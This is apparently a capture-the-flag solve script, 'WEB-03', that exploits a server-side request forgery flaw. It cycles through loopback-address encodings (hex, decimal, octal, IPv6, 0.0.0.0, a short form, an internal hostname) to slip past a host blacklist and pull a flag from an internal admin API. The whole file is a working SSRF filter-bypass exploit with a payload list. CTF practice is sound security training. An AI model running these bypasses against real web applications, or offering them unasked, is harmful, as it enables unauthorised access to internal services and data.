#!/usr/bin/env python3
"""
WEB-03 Solve Script: SSRF to Internal Service
Bypasses the weak host blacklist to reach the internal admin API.
"""

import requests
import json
import sys
import re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8003"

print(f"[*] Target: {TARGET}")

# SSRF bypass payloads for localhost
bypass_payloads = [
    ("0.0.0.0", "http://0.0.0.0:8080/flag"),
    ("IPv6 loopback", "http://[::1]:8080/flag"),
    ("Hex IP", "http://0x7f000001:8080/flag"),
    ("Decimal IP", "http://2130706433:8080/flag"),
    ("Octal IP", "http://0177.0.0.1:8080/flag"),
    ("internal-api host", "http://internal-api:8080/flag"),
    ("Short form", "http://0:8080/flag"),
]

print("[*] Testing SSRF bypass payloads...\n")

for name, payload in bypass_payloads:
    try:
        print(f"[*] Trying {name}: {payload}")
        r = requests.post(TARGET, data={"url": payload}, timeout=10)
        
        if "FLAG{" in r.text:
            flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
            if flag_match:
                print(f"\n[+] SUCCESS! Bypass: {name}")
                print(f"[+] FLAG CAPTURED: {flag_match.group(1)}")
                sys.exit(0)
        elif "restricted" in r.text.lower() or "blocked" in r.text.lower():
            print(f"    [-] Blocked by filter")
        else:
            print(f"    [-] No flag in response ({len(r.text)} bytes)")
    except Exception as e:
        print(f"    [-] Error: {e}")

print("\n[-] No bypass worked automatically. Try manual testing.")
